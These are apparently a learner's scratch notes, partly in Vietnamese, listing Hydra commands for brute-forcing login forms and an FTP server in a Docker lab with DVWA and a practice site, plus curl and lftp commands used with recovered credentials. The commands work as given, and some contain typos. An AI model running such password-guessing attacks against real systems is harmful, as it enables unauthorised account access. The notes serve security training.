Page
hydra -l user -p passwords.txt web_app http-post-form 'http://localhost:8000:username_field&password_field=^PASS^:wrong'


hydra -l jane.doe@example.com -P passwords.txt http-post-form "http://web_app:80/:email=^USER^&password=^PASS^:Content-Type=application/x-www-form-urlencoded:Bad combination of e-mail and password!"
hydra -l jane.doe@example.com -P passwords.txt web_app http-post-form "email=^USER^&password=^PASS^:Content-Type=application/x-www-form-urlencoded:Bad combination of e-mail and password!"


hydra -l admin -P passwords.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
hydra -l admin -P passwords.txt wizardly_booth hsttp-get-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=log\?pwd=wrong" -V
username=001&password=ssss&Login=Login&user_token=6ffe2046cbcc8623d06a366c5474cfc7

https://medium.com/@hamidullahbayram/using-hydra-on-login-pages-with-a-right-method-dvwa-training-1e85e8d4f5fd

brute-force với ftp:
lệnh vào kali: docker exec -it kali_container /bin/bash
hydra -l user -P home/kali_data/passwords.txt ftp_container ftp

Đăng nhập:
lftp ftp://user:strongpassword123@ftp_container
Lấy file từ server ftp
mget index.html

curl -H "Cookie: security=low; PHPSESSID=gaqp3n4hhqo3fqv8mf7ibt1es1" "http://172.23.0.4/vulnerabilities/brute/?username=admin&password=123&Login=Login"

hydra -l admin -P home/kali_data/passwords.txt 'http-get-form://dvwa_container/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low; PHPSESSID=gaqp3n4hhqo3fqv8mf7ibt1es1:Username and/or password incorrect.'